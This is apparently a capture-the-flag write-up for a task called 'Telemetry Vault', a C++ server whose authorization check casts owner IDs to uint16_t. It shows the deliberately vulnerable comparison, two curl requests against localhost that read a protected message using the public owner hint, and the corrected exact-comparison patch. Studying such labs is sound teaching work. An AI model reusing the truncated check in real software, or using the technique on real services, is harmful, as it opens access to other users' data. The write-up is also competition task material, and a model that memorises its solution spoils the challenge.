# Telemetry Vault — writeup

## Summary

- Stack: C++20 and a minimal custom HTTP server.
- Vulnerability: integer truncation leading to broken access control.
- Root cause: full owner IDs are cast to `uint16_t` before authorization.
- Canonical exploit: [`jury/exploit.py`](../../tasks/round-1/telemetry-vault/jury/exploit.py).

## Data model

Each message stores a full owner ID and text:

```cpp
struct Message {
    long long owner;
    std::string text;
};
```

Messages are created with `POST /api/messages`. `GET /api/messages` intentionally exposes each message ID and a short `owner_hint`, not the full owner ID. Reading requires both values:

```text
GET /api/messages/read?id=<id>&owner=<full owner id>
```

The jury selects an owner between `200000` and `299999` and stores the flag as message text.

## Vulnerable code

The public hint is deliberately truncated:

```cpp
static_cast<uint16_t>(message.owner)
```

That is acceptable for display. The bug is applying the same truncation to authorization:

```cpp
if (static_cast<uint16_t>(owner) !=
    static_cast<uint16_t>(found->second.owner)) {
    // 403
}
```

`uint16_t` stores values from `0` to `65535`; higher bits are discarded. The conversion is equivalent to reducing the value modulo `65536`:

```text
200000 mod 65536 = 3392
```

The full IDs `200000` and `3392` differ, but both become `3392` after the cast.

## Manual exploitation

Request the public list:

```bash
curl -s http://127.0.0.1:8000/api/messages
```

Example:

```json
[{"id":1,"owner_hint":3392}]
```

Use the hint as the owner ID:

```bash
curl -s 'http://127.0.0.1:8000/api/messages/read?id=1&owner=3392'
```

The server truncates both sides, considers them equal and returns the protected text.

## Canonical exploit

[`jury/exploit.py`](../../tasks/round-1/telemetry-vault/jury/exploit.py) loads the message list, submits each `owner_hint` as `owner`, and prints recovered text matching the flag format. The attacker never needs to reconstruct the high bits because the vulnerable comparison discards them.

## Correct patch

Compare the original values:

```cpp
if (owner != found->second.owner) {
    reply(client, 403, "{\"error\":\"wrong owner\"}");
} else {
    reply(client, 200, "{\"text\":\"" + found->second.text + "\"}");
}
```

Additional hardening can use one explicit unsigned type throughout and validate the accepted numeric range. Display-only truncation must never be reused for authorization.

The checker creates a message with owner `77777` and reads it with the same complete value. Exact comparison passes this flow; disabling reads or always returning `403` does not.

## Takeaway

`owner_hint` does not need to be secret. The vulnerability exists because the security decision uses the same lossy representation intended only for display.
